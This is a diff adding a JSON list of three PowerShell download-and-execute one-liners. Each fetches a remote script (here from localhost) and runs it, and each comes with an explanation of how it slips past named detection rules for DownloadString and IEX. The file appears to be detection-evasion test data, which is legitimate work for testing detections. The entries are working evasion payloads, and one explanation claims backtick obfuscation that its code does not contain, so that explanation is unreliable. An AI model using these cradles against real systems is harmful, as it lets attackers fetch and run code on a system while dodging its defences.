@@ -1,0 +1,14 @@
+[
+  {
+    "output": "$wc = New-Object System.Net.WebClient; $method = 'DownloadString'; $payload = $wc.$method('http://127.0.0.1/payload.ps1'); $exec = [scriptblock]::Create($payload); &$exec",
+    "explanation": "Bypasses selection_download by placing the method name 'DownloadString' into a string variable and calling it dynamically, avoiding the exact sequence '.DownloadString('. Bypasses selection_iex by casting the payload string to a scriptblock and executing it with the call operator (&), avoiding any variations of 'iex' or 'Invoke-Expression'."
+  },
+  {
+    "output": "$req = [System.Net.WebRequest]::Create('http://127.0.0.1/payload.ps1'); $res = $req.GetResponse(); $reader = New-Object System.IO.StreamReader($res.GetResponseStream()); $payload = $reader.ReadToEnd(); Invoke-Command -ScriptBlock ([scriptblock]::Create($payload))",
+    "explanation": "Bypasses selection_download by utilizing the .NET System.Net.WebRequest class instead of WebClient, Invoke-WebRequest, or Invoke-RestMethod. Bypasses selection_iex by creating a script block from the read string and running it via Invoke-Command, which does not match any strings in the IEX selection list."
+  },
+  {
+    "output": "$d = (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/payload.ps1'); $e = 'I'+'E'+'X'; Set-Alias -Name runme -Value $e; runme $d",
+    "explanation": "Bypasses selection_download by inserting backticks into the method name (.DownloadString), breaking the static string match. Bypasses selection_iex by concatenating the string 'IEX', assigning it to an alias, and then invoking the alias, meaning 'iex ' or 'IEX (' never appears in the command line."
+  }
+]
